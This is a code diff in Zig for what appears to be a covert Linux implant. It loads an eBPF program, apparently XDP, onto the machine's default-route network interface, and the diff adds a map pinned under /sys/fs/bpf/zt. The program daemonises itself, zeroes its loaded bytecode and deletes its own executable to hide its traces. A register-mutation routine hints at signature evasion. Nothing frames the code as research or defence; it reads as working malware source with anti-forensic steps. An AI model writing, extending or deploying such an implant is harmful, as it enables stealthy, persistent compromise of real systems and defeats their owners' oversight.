@@ -10,8 +10,7 @@ pub fn _start() noreturn {
 
     const iface = find_iface();
     const stack = sc.mmap(0, 65536, 3, 0x22, -1, 0);
-    const child = sc.clone(0x00000100 | 17, stack + 65536);
-    if (child != 0) sc.exit(0);
+    if (sc.clone(0x00000100 | 17, stack + 65536) != 0) sc.exit(0);
 
     const prog_fd = sc.bpf_syscall(5, &sc.bpf_attr_load{
         .prog_type = 6,
@@ -20,13 +19,19 @@ pub fn _start() noreturn {
         .license = @intFromPtr("GPL"),
     }, 128);
 
-    @memset(bpf_blob, 0); // Heap Scrubbing
+    const map_fd = sc.bpf_syscall(0, &sc.bpf_attr_map{
+        .map_type = 10,
+        .key_size = 16,
+        .value_size = 8,
+        .max_entries = 1024,
+    }, 72);
 
-    _ = sc.bpf_syscall(28, &sc.bpf_attr_link{
-        .prog_fd = @intCast(prog_fd),
-        .target_ifindex = iface,
-        .attach_type = 37,
-    }, 64);
+    _ = sc.mkdir("/sys/fs/bpf/zt", 0o755);
+    _ = sc.bpf_syscall(17, &sc.bpf_attr_pin{ .path = @intFromPtr("/sys/fs/bpf/zt/map"), .fd = @intCast(map_fd) }, 16);
+
+    @memset(bpf_blob, 0);
+
+    _ = sc.bpf_syscall(28, &sc.bpf_attr_link{ .prog_fd = @intCast(prog_fd), .target_ifindex = iface, .attach_type = 37 }, 64);
 
     _ = sc.unlink("/proc/self/exe");
     while (true) { _ = sc.nanosleep(3600); }
@@ -45,11 +50,11 @@ fn mutate_regs(insns: []u8) void {
 fn find_iface() u32 {
     var buf: [1024]u8 = undefined;
     const fd = sc.open("/proc/net/route", 0);
-    const bytes = sc.read(@intCast(fd), &buf, 1024);
+    const n = sc.read(@intCast(fd), &buf, 1024);
     _ = sc.close(@intCast(fd));
-    var lines = std.mem.tokenize(u8, buf[0..@intCast(bytes)], "\n");
-    _ = lines.next();
-    while (lines.next()) |l| {
+    var it = std.mem.tokenize(u8, buf[0..@intCast(n)], "\n");
+    _ = it.next();
+    while (it.next()) |l| {
         var p = std.mem.tokenize(u8, l, "\t ");
         const name = p.next() orelse continue;
         if (std.mem.eql(u8, p.next() orelse "", "00000000")) return get_idx(name);
@@ -72,9 +77,7 @@ fn parse_elf(blob: []u8) struct { offset: u64, size: u64 } {
     const shnum = @as(*u16, @ptrFromInt(@intFromPtr(blob.ptr) + 60)).*;
     for (0..shnum) |i| {
         const ptr = @intFromPtr(blob.ptr) + shoff + (i * 64);
-        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) {
-            return .{ .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, .size = @as(*u64, @ptrFromInt(ptr + 32)).* };
-        }
+        if (@as(*u32, @ptrFromInt(ptr + 4)).* == 1) return .{ .offset = @as(*u64, @ptrFromInt(ptr + 24)).*, .size = @as(*u64, @ptrFromInt(ptr + 32)).* };
     }
     return .{ .offset = 0, .size = 0 };
 }
